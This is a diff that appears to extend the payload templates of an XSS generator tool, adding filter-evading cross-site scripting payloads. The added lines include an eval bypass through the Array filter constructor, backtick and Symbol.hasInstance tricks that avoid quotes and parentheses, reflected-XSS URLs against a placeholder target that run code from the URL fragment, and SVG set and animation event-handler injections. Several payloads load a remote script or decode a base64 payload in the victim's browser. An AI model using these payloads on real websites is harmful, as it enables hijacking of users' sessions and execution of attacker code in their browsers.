@@ -17,11 +17,32 @@
 1⃣️ eval(JavaScript_content)
 eval('var a=document.createElement(\'script\');a.src=\'arr0w1_url\';document.body.appendChild(a)')
 
+🔥
+📖without eval
+📖 eval(CODE)    <=>   []["filter"]["constructor"](CODE)()
+[]["filter"]["constructor"]('var a=document.createElement(\'script\');a.src=\'arr0w1_url\';document.body.appendChild(a)')()
+
+
 2⃣️ eval(atob(JavaScript_content_BASE64encoded))
 eval(atob('arr0w1_base64'))
 
-🔥 using ` \ {} [] :     without . = ( ) ' " etc.
-`eval\x28atob\x28\x27arr0w1_base64\x27\x29\x29`instanceof{[Symbol[`hasInstance`]]:eval}</textarea>
+🔥
+📖 without . = ( ) ' " etc.
+📖 using ` \ {} [] :
+`eval\x28atob\x28\x27arr0w1_base64\x27\x29\x29`instanceof{[Symbol[`hasInstance`]]:eval}
+
+
+3⃣️ XSS in one step (only for Reflected XSS)
+
+🔴 Will be triggered when someone visits the URL:
+https://target.com/page?title="><script>eval(location.hash.split(%27%23%27)[1])</script><i id="#'eval\x28atob\x28\x27arr0w1_base64\x27\x29\x29'instanceof{[Symbol['hasInstance']]:eval}
+
+
+4⃣️ XSS in two steps
+eval(location.hash.split('#')[1])
+
+🔴 Will be triggered when someone visits the URL:
+https://target.com/page_with_the_payload#'eval\x28atob\x28\x27arr0w1_base64\x27\x29\x29'instanceof{[Symbol['hasInstance']]:eval}</textarea>
 
     <textarea id="data2" hidden="true">
 1⃣️ set onbegin
@@ -29,6 +50,10 @@ eval(atob('arr0w1_base64'))
 
 🔥
 "><svg style=display:none><set onbegin=`eval\x28atob\x28\x27arr0w1_base64\x27\x29\x29`instanceof{[Symbol[`hasInstance`]]:eval} dur=1s></svg><x id="
+
+🔥
+📖without eval
+"><svg style=display:none><set onbegin=[]['filter']['constructor'](atob('arr0w1_base64'))() dur=1s></svg><x id="
 
 2⃣️ animate onrepeat
 "><svg style=display:none><animate onrepeat="arr0w1_on_event_js" dur=1s repeatCount=2></svg><x id="
@@ -56,6 +81,7 @@ eval(atob('arr0w1_base64'))
 
 🔥
 "><style>@keyframes x{}</style><i style="animation-name:x" onanimationend=`eval\x28atob\x28\x27arr0w1_base64\x27\x29\x29`instanceof{[Symbol[`hasInstance`]]:eval}></i><x id="
+
 
 2⃣️ onwebkitanimationend
 "><style>@keyframes x{}</style><i style="animation-name:x" onwebkitanimationend="arr0w1_on_event_js"></i><x id="
